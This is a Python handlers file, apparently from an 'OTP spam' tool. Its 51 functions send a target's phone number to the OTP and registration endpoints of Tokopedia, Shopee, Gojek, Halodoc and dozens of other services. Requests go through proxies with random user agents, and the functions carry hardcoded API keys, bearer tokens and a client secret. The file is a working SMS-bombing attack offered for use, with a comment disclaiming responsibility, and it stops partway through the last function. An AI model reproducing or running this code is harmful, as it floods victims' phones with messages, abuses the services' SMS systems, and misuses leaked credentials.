#!/usr/bin/env python3
# handlers.py - ALL OTP APIs from Spam Script (50+ APIs with Proxy)
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import urllib.parse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, extract_csrf, get_random_user_agent, get_headers_with_random_ua
from proxy_manager import safe_request, get_proxy_manager

# ==================== HELPER FUNCTIONS ====================
def spam_otp_nilai(response, start, end):
    try:
        if response is None:
            return None
        idx = response.find(start)
        if idx == -1:
            return None
        idx += len(start)
        tail = response[idx:]
        end_idx = tail.find(end)
        if end_idx == -1:
            return None
        return tail[:end_idx]
    except:
        return None

def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = nomor
        username = "0" + nomor[3:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username

# ==================== HANDLERS DARI SCRIPT SPAM ====================

# 1. TOKOPEDIA (dari script)
def send_tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        sess = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = sess.get(url_token, headers={'User-Agent': get_random_user_agent()}, timeout=15)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False, None, 'No token'
        url = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": phone_plus,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        resp2 = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp2 and resp2.status_code == 200:
            return True, 200, 'OK'
        return False, resp2.status_code if resp2 else None, ''
    except:
        return False, None, ''

# 2. THAI FRIENDLY
def send_thaifriendly_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.thaifriendly.com/pl/index.php"
        data = {'z': 'phonelogingetpin', 'country': '62', 'number': phone_raw[1:], 'ppclienttoken': 'igq39qdc9rwk2ax1zrgdq'}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 3. SHOPEE
def send_shopee_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        phone_62 = '62' + phone_raw
        url = "https://shopee.co.id/api/v4/otp/send_vcode"
        data = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'x-api-source': 'rweb',
            'x-shopee-language': 'id',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'I8eSRy1l27NAL6ES8c9l05vVmpJMp8wd',
            'origin': 'https://shopee.co.id'
        }
        resp = safe_request('POST', url, headers=headers, json=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 4. KTBS
def send_ktbs_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://core.ktbs.io/v2/user/registration/otp/{phone_raw}"
        resp = safe_request('GET', url, headers={'User-Agent': get_random_user_agent()}, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 5. KLIKWA
def send_klikwa_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.klikwa.net/v1/number/sendotp"
        payload = {"number": f"+62{phone_raw}"}
        headers = {'Authorization': 'Basic QjMzOkZSMzM=', 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 6. PAYFAZ
def send_payfaz_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://api.payfazz.com/v2/phoneVerifications"
        data = {"phone": phone_local}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 7. SECUREDAPI (ConfirmTkt)
def send_securedapi_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone_raw}"
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 8. MATAHARI
def send_matahari_otp(phone):
    try:
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
        payload = {"otp_request": {"mobile_number": fmt_08(phone), "mobile_country_code": "+62"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 9. BATTLEFRONT (Danacepat)
def send_battlefront_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://battlefront.danacepat.com/v1/auth/common/phone/send-code"
        data = {'mobile_no': phone_raw}
        headers = {'User-Agent': 'Android/9;vivo/vivo 1902;KtaKilat/3.7.5'}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 10. PINJAMINDO
def send_pinjamindo_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{phone_raw}&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"
        resp = safe_request('GET', url, headers={'User-Agent': get_random_user_agent()}, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 11. JUMPSTART
def send_jumpstart_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.jumpstart.id/graphql"
        payload = {
            "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist",
            "variables": {"phoneNo": f"+62{phone_raw}"},
            "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }"
        }
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 12. ASANI
def send_asani_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.asani.co.id/api/v1/send-otp"
        payload = {"phone": f"62{phone_raw}", "email": "akuntesnuyul@gmail.com"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 13. DEPOP
def send_depop_otp(phone):
    try:
        url = "https://webapi.depop.com/api/auth/v1/verify/phone"
        payload = {"phone_number": fmt_phone_only(phone), "country_code": "ID"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('PUT', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 14. KLIKINDOMARET
def send_klikindomaret_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={phone_raw}"
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('GET', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 15. QTV A
def send_qtva_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg=="
        data = {
            "namaDepan": "Tahalu" + str(random.randrange(11, 99999)),
            "emailNope": phone_raw,
            "password": "Indo" + str(random.randrange(111, 999)),
            "konfirmasiPass": "Indo" + str(random.randrange(111, 999))
        }
        headers = {'User-Agent': get_random_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 16. DANACITA
def send_danacita_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.danacita.co.id/users/send_otp/?mobile_phone={phone_raw}"
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('GET', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 17. KREDITO
def send_kredito_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://app-api.kredito.id/client/v1/common/verify-code/send"
        data = f'{{"event":"default_verification","mobilePhone":"{phone_raw}","sender":"jatissms"}}'
        headers = {
            'User-Agent': 'okhttp/3.11.0 Dalvik/2.1.0',
            'Content-Type': 'application/json; charset=UTF-8',
            'LPR-TIMESTAMP': str(int(time.time() * 1000)),
            'Accept-Language': 'id-ID'
        }
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 18. MAUCASH
def send_maucash_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={phone_raw}&channelType=0"
        headers = {'User-Agent': 'okhttp/3.12.1', 'accept': 'application/json'}
        resp = safe_request('GET', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 19. GOJEK
def send_gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"
        data = {"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone": phone_62, "signed_up_country": "ID"}
        headers = {
            'User-Agent': 'okhttp/3.12.1',
            'X-Session-ID': str(uuid.uuid4()),
            'X-Platform': 'Android',
            'Accept': 'application/json',
            'Accept-Language': 'id-ID'
        }
        resp = safe_request('POST', url, headers=headers, json=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 20. HARVESTCAKE
def send_harvestcake_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://harvestcakes.com/register"
        data = {"phone": phone_raw}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 21. OYO
def send_oyo_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"
        payload = {
            "phone": phone_raw,
            "country_code": "+62",
            "country_iso_code": "ID",
            "nod": "4",
            "send_otp": "true",
            "devise_role": "Consumer_Guest"
        }
        headers = {
            'Content-Type': 'application/json',
            'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
            'User-Agent': get_random_user_agent()
        }
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 22. FOREIGN ADMITS
def send_foreignadmits_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://foreignadmits.com/api/register-otp-generate-student"
        data = {'mobile': f'62{phone_raw}', 'countryCode': '+62'}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 23. SAYURBOX
def send_sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
        payload = {
            "operationName": "generateOTP",
            "variables": {"destinationType": "whatsapp", "identity": phone_plus},
            "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"
        }
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 24. TOKKO
def send_tokko_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.tokko.io/graphql"
        payload = {
            "operationName": "generateOTP",
            "variables": {"generateOtpInput": {"phoneNumber": phone_plus, "hashCode": "", "channel": "WHATSAPP", "userType": "MERCHANT"}},
            "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"
        }
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 25. CARSOME
def send_carsome_otp(phone):
    try:
        url = "https://www.carsome.id/website/login/sendSMS"
        payload = {"username": fmt_08(phone), "optType": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 26. JENIUS
def send_jenius_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.com/jenius"
        payload = {
            "query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }",
            "variables": {"phone": phone_plus, "language": "id"},
            "operationName": "registerPhone"
        }
        headers = {
            'Content-Type': 'application/json',
            'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d',
            'User-Agent': get_random_user_agent()
        }
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 27. ALODOKTER
def send_alodokter_otp(phone):
    try:
        url = "https://www.alodokter.com/login-with-phone-number"
        payload = {"user": {"phone": fmt_08(phone)}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 28. PIZZAHUT
def send_pizzahut_otp(phone):
    try:
        url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=6))
        payload = {
            "email": f"{name.lower()}@gmail.com",
            "first_name": name,
            "last_name": "Test",
            "password": "Pass123!",
            "phone": phone_08,
            "birthday": "2000-01-01"
        }
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 29. MISTERALADIN
def send_misteraladin_otp(phone):
    try:
        url = "https://m.misteraladin.com/api/members/v2/otp/request"
        payload = {"phone_number_country_code": "62", "phone_number": fmt_phone_only(phone), "type": "register"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 30. ICQ
def send_icq_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://u.icq.net/api/v14/rapi/auth/sendCode"
        payload = {
            "reqId": f"{random.randint(10000,99999)}-{int(time.time())}",
            "params": {"phone": phone_plus, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}
        }
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 31. CAIRIN
def send_cairin_otp(phone):
    try:
        url = "https://app.cairin.id/v1/app/sms/sendCaptcha"
        data = {
            "haveImageCode": "0",
            "fileName": uuid.uuid4().hex,
            "phone": fmt_08(phone),
            "imageCode": "",
            "userImei": "",
            "type": "registry"
        }
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 32. MAPCLUB
def send_mapclub_otp(phone):
    try:
        url = "https://cmsapi.mapclub.com/api/signup-otp"
        data = {"phone": fmt_08(phone)}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 33. BUKUWARUNG
def send_bukuwarung_otp(phone):
    try:
        url = "https://api-v2.bukuwarung.com/api/v2/auth/otp/send"
        payload = {
            "action": "LOGIN_OTP",
            "countryCode": "+62",
            "deviceId": "test-1",
            "method": "WA",
            "phone": fmt_08(phone),
            "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
            "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
        }
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 34. RUPIAH CEPAT
def send_rupiahcepat_otp(phone):
    try:
        url = "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code"
        phone_raw = fmt_phone_only(phone)
        data = {
            "data": json.dumps({
                "mobile": phone_raw,
                "noise": str(int(time.time() * 1000)),
                "request_time": str(int(time.time() * 1000)),
                "access_token": "11111"
            })
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 35. ADIRAKU
def send_adiraku_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        payload = {"mobileNumber": phone_local, "type": "prospect-create", "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 36. SINGA
def send_singa_otp(phone):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
        payload = {"mobile_phone": fmt_08(phone), "type": "mobile", "is_switchable": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 37. PINHOME (dari script)
def send_pinhome_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {
            "accountType": "customers",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": phone_local
        }
        headers = {
            'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731',
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent()
        }
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 38. DUNIAGAMES (dari script)
def send_duniagames_otp(phone):
    try:
        phone_plus, username = format_nomor(phone)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": phone_plus, "userName": username}
        headers = {'Content-Type': 'application/json', 'x-device': str(uuid.uuid4()), 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 39. ACC
def send_acc_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.acc.co.id/register/new-account"
        payload = f'[{{"user_id":null,"action":"register","send_to":"{phone_local}","provider":"whatsapp"}}]'
        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'User-Agent': get_random_user_agent(),
            'next-action': '7f4271400eb36624563cc4172891e0c821039f2fca'
        }
        resp = safe_request('POST', url, headers=headers, data=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 40. ABSENKU
def send_absenku_otp(phone):
    try:
        phone_local = fmt_08(phone)
        sess = requests.Session()
        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_user_agent()}, timeout=15)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={
            "nama": "Nama Lengkap",
            "email": "email@gmail.com",
            "telp": phone_local,
            "company_name": "PT Test",
            "jumlah": "10",
            "tujuan": "1",
            "paket": "21",
            "ci_csrf_token": ""
        }, headers=headers, timeout=15)
        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_local}, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 41. SATURDAYS
def send_saturdays_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        payload = {"number": phone_local, "country_code": "+62", "type": ""}
        headers = {'Content-Type': 'application/json', 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 42. MAULAGI (dari script)
def send_maulagi_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://api.maulagi.id/api/v2/auth/check"
        payload = {"credentials": phone_local}
        headers = {'Content-Type': 'application/json', 'x-ml-key': 'E32VCHXX32', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 43. HALODOC
def send_halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
        payload = {"phone_number": phone_plus, "channel": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 44. BLIBLI
def send_blibli_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"
        payload = {"username": phone_local}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 45. DEKORUMA
def send_dekoruma_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json"
        payload = {"phoneNumber": phone_plus, "platform": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 46. OLX
def send_olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 47. INDIHOME
def send_indihome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
        data = {'type': 'hp', 'msisdn': phone_raw}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 48. TOKOMANAMANA
def send_tokomanamana_otp(phone):
    try:
        url = "https://tokomanamana.com/ma/auth/request_token_merchant/"
        data = {"phone": fmt_08(phone)}
        headers = {'User-Agent': get_random_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 49. JADGREWARD
def send_jadgreward_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://id.jagreward.com/member/verify-mobile/{phone_raw}/"
        headers = {'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        resp = safe_request('GET', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 50. GINEE
def send_ginee_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://accounts.ginee.com/api/iam-service/account/send-verification-code"
        payload = {"account": phone_local, "countryCode": "ID", "verificationPurpose": "USER_REGISTRATION", "verificationType": "PHONE"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 51. BERYLLIUM MAPCLUB
def send_beryllium_otp(phone):
    try:
        url = "https://beryllium.mapclub.com/api/member/registration/sms/otp"
        payload = {"account": fmt_08(phone)}
